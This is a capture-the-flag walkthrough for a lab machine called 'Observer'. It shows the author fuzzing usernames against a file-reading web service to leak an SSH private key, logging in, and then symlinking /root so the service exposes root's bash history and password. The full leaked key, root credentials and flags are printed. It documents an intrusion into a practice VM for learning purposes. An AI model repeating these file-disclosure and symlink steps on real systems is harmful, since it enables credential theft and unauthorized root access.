# Observer

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.171:22
Open 10.0.2.171:3333
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.171
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3o4mI7uASKMmSXi1ktBAkiph60IX52JaKgbuS5hJtX2nGn8JIvaGZjT50iAGX7GdSd7O2uGU6whos6zh1OEMk=
|   256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8MvYrFJd08kv8oTQLwj5p1yOEycvQQBFnStnx4Mred
3333/tcp open  http    syn-ack Golang net/http server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 16E3C60DA65F629FAF87E58C4BBCBFAE
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 03 Jan 2026 11:44:04 GMT
|     Content-Length: 105
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST 
|     <!-- gmotaFetHsbZRjxAwnwekrBEmfdzdcHMV -->
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 03 Jan 2026 11:43:49 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- DaFpLSjFbcXoEFfRsWxPLDnJObCsNVHMV -->
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 03 Jan 2026 11:43:49 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (3333)


```bash
└─$ curl 10.0.2.171:3333/ -i
HTTP/1.1 200 OK
Date: Sat, 03 Jan 2026 11:56:59 GMT
Content-Length: 78
Content-Type: text/plain; charset=utf-8

OBSERVING FILE: /home/ NOT EXIST

<!-- bGMDNecepIeeBFSNZAylzdkCZpcwAXHMV --> 
```

```bash
└─$ curl 10.0.2.171:3333/user -i
HTTP/1.1 200 OK
Date: Sat, 03 Jan 2026 11:57:29 GMT
Content-Length: 82
Content-Type: text/plain; charset=utf-8

OBSERVING FILE: /home/user NOT EXIST

<!-- ZjMXAbHCOUoYqXJVPxEpXXckdrGqdnHMV --> 
```

```bash
└─$ curl 10.0.2.171:3333/../etc/passwd --path-as-is -iL
HTTP/1.1 301 Moved Permanently
Content-Type: text/html; charset=utf-8
Location: /etc/passwd
Date: Sat, 03 Jan 2026 11:57:45 GMT
Content-Length: 46

HTTP/1.1 200 OK
Date: Sat, 03 Jan 2026 11:57:45 GMT
Content-Length: 88
Content-Type: text/plain; charset=utf-8

OBSERVING FILE: /home/etc/passwd NOT EXIST

<!-- ZWjFMoVhcShVoLLxjpTQGJPobhiGRRHMV --> 
```

We seem to can access files from `/home`, but no path traversal. To leak SSH we need a valid username.

```bash
└─$ ffuf -u 'http://10.0.2.171:3333/FUZZ/.ssh/id_rsa' -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -fw 8
jan                     [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 14ms]
```

```bash
└─$ curl 10.0.2.171:3333/jan/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA6Tzy2uBhFIRLYnINwYIinc+8TqNZap0CB7Ol3HSnBK9Ba9pGOSMT
Xy2J8eReFlni3MD5NYpgmA67cJAP3hjL9hDSZK2UaE0yXH4TijjCwy7C4TGlW49M8Mz7b1
LsH5BDUWZKyHG/YRhazCbslVkrVFjK9kxhWrt1inowgv2Ctn4kQWDPj1gPesFOjLUMPxv8
fHoutqwKKMcZ37qePzd7ifP2wiCxlypu0d2z17vblgGjI249E9Aa+/hKHOBc6ayJtwAXwc
ivKmNrJyrSLKo+xIgjF5uV0grej1XM/bXjv39Z8XF9h4FEnsfzUN4MmL+g8oclsaO5wgax
5X3Avamch/vNK3kiQO2qTS1fRZU6T7O9tII3NmYDh00RcpIZCEAztSsos6c1BUoj6Rap+K
s1DZQzamQva7y4Grit+UmP0APtA0vZ/vVpqZ+259CXcYvuxuOhBYycEdLHVEFrKD4Fy6QE
kC27Xv6ySoyTvWtL1VxCzbeA461p0U0hvpkPujDHAAAFiHjTdqp403aqAAAAB3NzaC1yc2
EAAAGBAOk88trgYRSES2JyDcGCIp3PvE6jWWqdAgezpdx0pwSvQWvaRjkjE18tifHkXhZZ
4tzA+TWKYJgOu3CQD94Yy/YQ0mStlGhNMlx+E4o4wsMuwuExpVuPTPDM+29S7B+QQ1FmSs
hxv2EYWswm7JVZK1RYyvZMYVq7dYp6MIL9grZ+JEFgz49YD3rBToy1DD8b/Hx6LrasCijH
Gd+6nj83e4nz9sIgsZcqbtHds9e725YBoyNuPRPQGvv4ShzgXOmsibcAF8HIrypjaycq0i
yqPsSIIxebldIK3o9VzP21479/WfFxfYeBRJ7H81DeDJi/oPKHJbGjucIGseV9wL2pnIf7
zSt5IkDtqk0tX0WVOk+zvbSCNzZmA4dNEXKSGQhAM7UrKLOnNQVKI+kWqfirNQ2UM2pkL2
u8uBq4rflJj9AD7QNL2f71aamftufQl3GL7sbjoQWMnBHSx1RBayg+BcukBJAtu17+skqM
k71rS9VcQs23gOOtadFNIb6ZD7owxwAAAAMBAAEAAAGAJcJ6RrkgvmOUmMGCPJvG4umowM
ptRXdZxslsxr4T9AwzeTSDPejR0AzdUk34dYHj2n1bWzGl5bgs3FJWX0yAaLvcc/QuHJyy
1IqMu0npLhQ59J9G+AXBHRLyedlg5NNEMr9ux/iyVRPOT1LV5m/jNeqSIUHIWRoUM3EIvY
wxRz4wvGzh7YECMItvHhSJgQYU4Eofme9MTcG+DJx31iAzXegjQNZuKdzyyAMuhHSjXiux
r6C/Pp/oXnaZ+QbRw/rsmZZhm1kpFwnC5QWLllWjUhYIyhzgkxeN+ELerf4VcRdXpR+9HO
DMTQf7xjAsDWAF23pS3jf4GSGM53LOvzvJ8GV8zFYZJeX02eiwn4GiY2lbAM01TAPsvM7e
Rbp9/U9wt7vpRJETHAQusQkQmxo+h6PztzdkNw0oszhY/IIusReYH5wJRtbQu7Eb0iu+HS
/AM7EEWQ8aG576LuXU2d4kjEQCyE3XqtisuteuHXW6/xX85fnuPovRYyx8e8j6Oo8RAAAA
wEhOxtgacCvsSrdBGNGif6/2k8rPnpp0QLitTclIrckQIBjYxKef7i+GHjBIUoyYLkwGDO
fWApUSugEzxVX3VyhkIHaiDi+7Ijy2GuAHQO1WsN4gS3xv9oMNjiA27dTvkSYx6SCFeCYX
t5BuyKDzk82rWj2U7HxkMrmuIdSSPy8Kev1I2A973qyDaV0GrSUDEPa3Hs6IZKpYOrA+aD
4WTrp2E74BG0Py+TaBra9QZe6DlopEtK01+n8k5uw1fa8CLAAAAMEA9p0hlgVu1qYY8MFa
JxNh2PsuLkRpxBd+gbQX+PSCHDsVx8NoD5YVdUlnr7Ysgubo8krNfJCYgfMRHRT/2WAJk2
U5mtYFUYwgCK4ITPC9IzVnRB1hcrrHD58rDSZV3B5gLyUSHgzB+GiNujym+95UrA644iE1
0umTs7tKEuZzmFiJBBUL+q97+1Qhx6XiIVJs1gbPLmNI6SlXcVh25UHP2DUU+gPpc6Gjsj
vquxbDcGtcvp+OgiHK6haNLqXbNbyrAAAAwQDyHX3sMMhbZEou35XxlOSNIOO6ijXyomx1
pvHApbImNyvIN49+b3mHfahKJp1n7cbsl0ypNSSaCPZp7iEdKzFHsxEuOIb0UyRBwgRmXw
zz2MKT58znZbqXibrawxCg7SEwHL6Z/IOfymgRnTehk0RrTkn1S1ZJaO+Zx0o09/O/dLwu
NkCnFoC0qz0G5Box7EOPENbPHaq6CDefWciYzy1yrADOdqUSlnGtS/TK1tBfgzZbwL4C6c
U+OPQBwGQPpFUAAAAMamFuQG9ic2VydmVyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

## SSH

```bash
└─$ curl 10.0.2.171:3333/jan/.ssh/id_rsa -sO
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa jan@10.0.2.171
jan@observer:~$ id
uid=1000(jan) gid=1000(jan) grupos=1000(jan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```bash
jan@observer:~$ cat user.txt
HMVdDepYxsi8VSucdruB3P7
```

## Privilege Escalation

```
jan@observer:~$ sudo -l
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status
```

We see following output, interesting part is `observer`
```bash
jan@observer:~$ sudo /usr/bin/systemctl -l status
...
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─435 /usr/sbin/cron -f
           │ │ ├─438 /usr/sbin/CRON -f
           │ │ ├─440 /bin/sh -c /opt/observer
           │ │ └─442 /opt/observer
...
```

Also `!command` or `|XCommand` didn't work :(

Most likely the observer is the `3333` port. Create soft link
```bash
jan@observer:~$ ln -s /root /home/jan/root
```

```bash
└─$ curl 10.0.2.171:3333/jan/root/.ssh/id_rsa
OBSERVING FILE: /home/jan/root/.ssh/id_rsa NOT EXIST

└─$ curl 10.0.2.171:3333/jan/root/.ssh/.bash_history
OBSERVING FILE: /home/jan/root/.ssh/.bash_history NOT EXIST

└─$ curl 10.0.2.171:3333/jan/root/.bash_history
...
paswd
fuck1ng0bs3rv3rs
passwd
...
```

```bash
jan@observer:~$ timeout 1 echo fuck1ng0bs3rv3rs | su - root -c id
Contraseña: uid=0(root) gid=0(root) grupos=0(root)
```

> Creds: `root:fuck1ng0bs3rv3rs`

### Root.txt

```bash
└─$ curl 10.0.2.171:3333/jan/root/root.txt
HMVb6MPDxdYLLC3sxNLIOH1
```